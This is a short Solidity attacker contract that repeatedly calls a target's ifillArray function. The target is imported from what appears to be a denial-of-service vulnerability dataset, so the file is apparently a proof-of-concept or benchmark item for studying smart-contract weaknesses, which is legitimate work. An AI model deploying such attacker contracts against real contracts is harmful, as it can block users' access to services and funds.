pragma solidity ^0.4.25;

import "../dataset/denial_of_service/dos_simple.sol";

contract DosOneFuncAttacker {
    DosOneFunc public target;

    constructor(address _targetAddress) public {
        target = DosOneFunc(_targetAddress);
    }

    // Repeatedly call the ifillArray function to fill the array
    function attack() public {
        uint256 count = 0;
        while (count < 3) {
            target.ifillArray();
            count++;
        }
    }
}